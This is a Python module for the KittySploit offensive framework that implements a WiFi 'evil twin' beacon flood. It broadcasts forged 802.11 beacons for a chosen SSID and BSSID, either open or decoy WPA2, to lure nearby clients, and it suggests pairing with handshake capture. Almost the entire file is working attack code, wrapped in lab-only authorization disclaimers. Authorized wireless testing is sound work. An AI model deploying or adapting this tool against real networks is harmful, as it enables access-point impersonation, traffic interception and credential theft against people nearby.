#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""Evil-twin style beacon flood (authorized social-engineering labs only)."""

from __future__ import annotations
from kittysploit import *
from lib.protocols.wlan.mac import mac_to_str, random_client_mac
from lib.protocols.wlan.wlan_client import Wlan_client


class Module(Auxiliary, Wlan_client):
    __info__ = {
        "name": "WiFi Evil Twin Beacon Flood",
        "description": (
            "Broadcast forged 802.11 beacons for a chosen SSID/BSSID to lure probes "
            "(open or fake WPA2 beacon). Lab / written authorization required."
        ),
        "author": ["KittySploit Team"],
        "tags": ["wlan", "wifi", "evil-twin", "802.11"],
        "references": ["https://attack.mitre.org/techniques/T1557/003/"],
        "attack": {
            "tactics": ["TA0006"],
            "techniques": ["T1557.003"],
            "prerequisites": ["Authorized captive-portal / twin exercise"],
        },
    }

    ssid = OptString("FreeWiFi", "SSID to advertise", required=True)
    channel = OptInteger(6, "Beacon channel IE", required=True)
    bssid = OptString("", "AP BSSID (empty = random locally administered)", required=False)
    duration = OptInteger(60, "Flood duration in seconds", required=False)
    interval = OptFloat(0.12, "Seconds between beacon injections", required=False)
    open_ap = OptBool(True, "Advertise open network (else WPA2-looking RSN)", required=False)

    def check(self):
        if not str(self.ssid or "").strip():
            print_error("SSID required")
            return False
        return self.wlan_check_iface()

    def run(self):
        ssid = str(self.ssid).strip()
        ch = max(1, int(self.channel or 6))
        duration = max(5, int(self.duration or 60))
        interval = float(self.interval or 0.12)
        bssid = str(self.bssid or "").strip()
        if not bssid:
            bssid = mac_to_str(random_client_mac())
        bssid = bssid.lower()

        self.wlan_set_channel(ch)
        mode = "OPEN" if bool(self.open_ap) else "WPA2-PSK (decoy)"
        print_warning("Evil twin beacons may violate local law without authorization")
        print_info(f"Flooding {ssid} | {bssid} | ch{ch} | {mode} | {duration}s")

        sent = self.wlan_flood_beacons(
            bssid,
            ssid,
            ch,
            duration=float(duration),
            interval=interval,
            open_network=bool(self.open_ap),
        )
        print_success(f"Injected ~{sent} beacon(s)")
        print_info("Pair with handshake_capture or probe_request_scan to observe client interest")
        return sent > 0